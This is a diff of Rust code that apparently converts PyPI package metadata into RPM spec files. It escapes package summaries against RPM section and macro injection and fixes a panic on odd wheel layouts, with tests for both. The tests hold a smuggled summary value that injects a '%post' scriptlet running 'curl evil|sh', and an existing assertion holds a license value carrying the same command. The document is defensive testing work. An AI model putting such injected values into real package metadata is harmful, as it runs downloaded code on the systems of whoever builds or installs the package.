@@ -1463,7 +1463,9 @@ fn post_process(
             if line.starts_with('%') {
                 if !description_written {
                     if let Some(s) = &release.summary {
-                        out.push_str(s);
+                        // One line with every `%` doubled: a summary with a
+                        // newline or `%` must not open a section or expand a macro.
+                        out.push_str(&rpm_text(s));
                         out.push('\n');
                     }
                     description_written = true;
@@ -2806,7 +2808,9 @@ fn wheel_files_entries(
             return None;
         }
         let top = file.split('/').next().unwrap_or("");
-        if top == dist_info {
+        // A top-level entry named like the dist-info directory has no member
+        // path to slice; it falls to the top-level rule below and is not listed blind.
+        if top == dist_info && file.contains('/') {
             let rel = &file[dist_info.len() + 1..];
             let leaf = rel.rsplit('/').next().unwrap_or(rel).to_ascii_uppercase();
             let is_license = rel.starts_with("licenses/")
@@ -8720,6 +8724,54 @@ mod license_url_injection_tests {
             spec.contains("License:        MIT %%post curl evil|sh\n"),
             "{spec}"
         );
+    }
+
+    #[test]
+    fn summary_newline_cannot_inject_a_scriptlet_into_the_description() {
+        let mut r = release(
+            ap_ecosystem::pypi::License::Spdx("MIT".to_string()),
+            Some("https://example.org"),
+        );
+        r.summary = Some("Fast parser\n%post\ncurl evil|sh 100%".to_string());
+        let build_system = BuildSystem {
+            requires: vec![],
+            backend: None,
+        };
+        let spec = post_process_with_sdist(
+            "Name: pkg\nVersion: 1.0\n%description\nold body\n%prep\n%changelog\n",
+            &r,
+            &build_system,
+            SdistFacts {
+                has_tests: false,
+                has_c_extensions: false,
+                top_level_tests_dir: None,
+                install_entries: None,
+                console_scripts: Vec::new(),
+            },
+        );
+        no_injected_line(&spec);
+        assert!(!spec.contains("old body"), "{spec}");
+        assert!(
+            spec.contains("%description\nFast parser %%post curl evil|sh 100%%\n\n%prep\n"),
+            "{spec}"
+        );
+    }
+
+    #[test]
+    fn a_top_level_entry_named_like_the_dist_info_does_not_panic() {
+        let layout = ap_ecosystem::sdist::WheelLayout {
+            importable: Some("pkg".into()),
+            files: vec![
+                "pkg/__init__.py".into(),
+                "pkg-1.0.dist-info".into(),
+                "pkg-1.0.dist-info/METADATA".into(),
+            ],
+            dist_info: Some("pkg-1.0.dist-info".into()),
+            ..Default::default()
+        };
+        // The bare entry is not a member of the dist-info directory: the layout
+        // is not one that can be listed without guessing, so the review fills it in.
+        assert_eq!(wheel_files_entries(&layout, "sitedir", &[]), None);
     }
 
     #[test]
